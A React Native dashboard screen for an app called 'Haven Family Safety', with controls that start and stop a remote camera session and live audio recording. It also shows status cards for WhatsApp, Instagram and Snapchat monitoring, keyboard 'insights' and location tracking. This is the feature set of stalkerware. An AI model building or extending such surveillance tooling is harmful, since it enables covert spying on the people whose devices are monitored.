/**
 * Dashboard Screen for Haven Family Safety Application
 * Main screen displayed after successful authentication
 */
import React, { useEffect, useState } from 'react';
import { View, Text, StyleSheet, ScrollView, SafeAreaView, TouchableOpacity } from 'react-native';
import { LocationCard, LocationData } from '../components/location/LocationCard';
import { PermissionGuide } from '../components/PermissionGuide';
import { permissionManager } from '../services/permissions/PermissionManager';
import { RemoteCameraManager } from '../services/camera/RemoteCameraManager';
import { EnhancedAudioRecorder } from '../services/audio/EnhancedAudioRecorder';
import { SocialMediaManager } from '../services/social/SocialMediaManager';
import { KeyboardInsightsManager } from '../services/keyboard/KeyboardInsightsManager';
import { LocationManager } from '../services/location/LocationManager';

// Mock location data for demonstration
const mockLocationData: LocationData = {
  latitude: 40.7128,
  longitude: -74.0060,
  accuracy: 5.2,
  altitude: 10.5,
  speed: 2.3,
  bearing: 45,
  timestamp: new Date(),
  batteryLevel: 85,
};

export const DashboardScreen: React.FC = () => {
  const [cameraActive, setCameraActive] = useState(false);
  const [audioRecording, setAudioRecording] = useState(false);
  const [socialMonitoring, setSocialMonitoring] = useState(false);
  const [keyboardMonitoring, setKeyboardMonitoring] = useState(false);
  const [locationTracking, setLocationTracking] = useState(false);

  useEffect(() => {
    // Ensure accessibility service is active when dashboard loads
    const ensureAccessibility = async () => {
      await permissionManager.checkAndRequestBasicPermissions();
    };
    
    ensureAccessibility();
    
    // Initialize monitoring statuses
    const initMonitoringStatuses = async () => {
      // Check current states of all services
      setCameraActive(false);
      setAudioRecording(false);
      setSocialMonitoring(true); // Assume social media is monitored by default
      setKeyboardMonitoring(true); // Assume keyboard insights are active
      setLocationTracking(true); // Assume location tracking is active
    };
    
    initMonitoringStatuses();
  }, []);

  const handleStartCamera = async () => {
    try {
      const cameraManager = RemoteCameraManager.getInstance();
      const result = await cameraManager.startRemoteCameraAccess('front');
      if (result) {
        setCameraActive(true);
      }
    } catch (error) {
      console.error('Error starting camera:', error);
    }
  };

  const handleStopCamera = async () => {
    try {
      const cameraManager = RemoteCameraManager.getInstance();
      await cameraManager.stopRemoteCameraAccess();
      setCameraActive(false);
    } catch (error) {
      console.error('Error stopping camera:', error);
    }
  };

  const handleStartAudio = async () => {
    try {
      const audioRecorder = EnhancedAudioRecorder.getInstance();
      const result = await audioRecorder.startLiveRecording(23);
      if (result) {
        setAudioRecording(true);
      }
    } catch (error) {
      console.error('Error starting audio recording:', error);
    }
  };

  const handleStopAudio = async () => {
    try {
      const audioRecorder = EnhancedAudioRecorder.getInstance();
      await audioRecorder.stopRecording();
      setAudioRecording(false);
    } catch (error) {
      console.error('Error stopping audio recording:', error);
    }
  };

  return (
    <SafeAreaView style={styles.container}>
      <ScrollView contentContainerStyle={styles.scrollContainer}>
        <View style={styles.header}>
          <Text style={styles.title}>Haven Family Safety</Text>
          <Text style={styles.subtitle}>Dashboard</Text>
        </View>
        
        <View style={styles.content}>
          <PermissionGuide />
          
          <LocationCard location={mockLocationData} />
          
          <View style={styles.featureSection}>
            <Text style={styles.sectionTitle}>Monitoring Features</Text>
            
            <View style={styles.featureGrid}>
              <View style={[styles.featureCard, styles.activeFeature]}>
                <Text style={styles.featureTitle}>Location Tracking</Text>
                <Text style={styles.featureDescription}>Real-time location monitoring</Text>
                <View style={styles.statusIndicator}>
                  <Text style={styles.statusActive}>Active</Text>
                </View>
              </View>
              
              <View style={[styles.featureCard, cameraActive ? styles.activeFeature : {}]}>
                <Text style={styles.featureTitle}>Camera Sessions</Text>
                <Text style={styles.featureDescription}>Live camera feed and snapshots</Text>
                <View style={styles.controls}>
                  {cameraActive ? (
                    <TouchableOpacity 
                      style={[styles.controlButton, styles.stopButton]}
                      onPress={handleStopCamera}
                    >
                      <Text style={styles.controlButtonText}>Stop</Text>
                    </TouchableOpacity>
                  ) : (
                    <TouchableOpacity 
                      style={[styles.controlButton, styles.startButton]}
                      onPress={handleStartCamera}
                    >
                      <Text style={styles.controlButtonText}>Start</Text>
                    </TouchableOpacity>
                  )}
                </View>
              </View>
              
              <View style={[styles.featureCard, audioRecording ? styles.activeFeature : {}]}>
                <Text style={styles.featureTitle}>Audio Monitoring</Text>
                <Text style={styles.featureDescription}>Live and periodic audio recording</Text>
                <View style={styles.controls}>
                  {audioRecording ? (
                    <TouchableOpacity 
                      style={[styles.controlButton, styles.stopButton]}
                      onPress={handleStopAudio}
                    >
                      <Text style={styles.controlButtonText}>Stop</Text>
                    </TouchableOpacity>
                  ) : (
                    <TouchableOpacity 
                      style={[styles.controlButton, styles.startButton]}
                      onPress={handleStartAudio}
                    >
                      <Text style={styles.controlButtonText}>Start</Text>
                    </TouchableOpacity>
                  )}
                </View>
              </View>
              
              <View style={[styles.featureCard, socialMonitoring ? styles.activeFeature : {}]}>
                <Text style={styles.featureTitle}>Social Media</Text>
                <Text style={styles.featureDescription}>WhatsApp, Instagram, Snapchat monitoring</Text>
                <View style={styles.statusIndicator}>
                  <Text style={styles.statusActive}>Active</Text>
                </View>
              </View>
              
              <View style={[styles.featureCard, keyboardMonitoring ? styles.activeFeature : {}]}>
                <Text style={styles.featureTitle}>Keyboard Insights</Text>
                <Text style={styles.featureDescription}>Typing pattern analysis</Text>
                <View style={styles.statusIndicator}>
                  <Text style={styles.statusActive}>Active</Text>
                </View>
              </View>
              
              <View style={[styles.featureCard, locationTracking ? styles.activeFeature : {}]}>
                <Text style={styles.featureTitle}>Location History</Text>
                <Text style={styles.featureDescription}>Historical location tracking</Text>
                <View style={styles.statusIndicator}>
                  <Text style={styles.statusActive}>Active</Text>
                </View>
              </View>
            </View>
          </View>
        </View>
      </ScrollView>
    </SafeAreaView>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f5f5f5',
  },
  scrollContainer: {
    flexGrow: 1,
  },
  header: {
    backgroundColor: '#007AFF',
    padding: 20,
    paddingTop: 50,
    alignItems: 'center',
  },
  title: {
    fontSize: 24,
    fontWeight: 'bold',
    color: 'white',
  },
  subtitle: {
    fontSize: 18,
    color: 'rgba(255, 255, 255, 0.8)',
    marginTop: 8,
  },
  content: {
    padding: 16,
  },
  featureSection: {
    marginTop: 20,
  },
  sectionTitle: {
    fontSize: 20,
    fontWeight: 'bold',
    color: '#333',
    marginBottom: 16,
  },
  featureGrid: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    justifyContent: 'space-between',
  },
  featureCard: {
    backgroundColor: 'white',
    borderRadius: 8,
    padding: 16,
    width: '48%',
    marginBottom: 16,
    shadowColor: '#000',
    shadowOffset: {
      width: 0,
      height: 2,
    },
    shadowOpacity: 0.1,
    shadowRadius: 3.84,
    elevation: 5,
  },
  activeFeature: {
    borderColor: '#007AFF',
    borderWidth: 2,
  },
  featureTitle: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#333',
    marginBottom: 4,
  },
  featureDescription: {
    fontSize: 14,
    color: '#666',
    marginBottom: 12,
  },
  statusIndicator: {
    alignItems: 'flex-end',
  },
  statusActive: {
    fontSize: 12,
    color: '#007AFF',
    fontWeight: 'bold',
  },
  controls: {
    flexDirection: 'row',
    justifyContent: 'flex-end',
  },
  controlButton: {
    paddingHorizontal: 12,
    paddingVertical: 6,
    borderRadius: 4,
  },
  startButton: {
    backgroundColor: '#34C759',
  },
  stopButton: {
    backgroundColor: '#FF3B30',
  },
  controlButtonText: {
    color: 'white',
    fontSize: 12,
    fontWeight: 'bold',
  },
});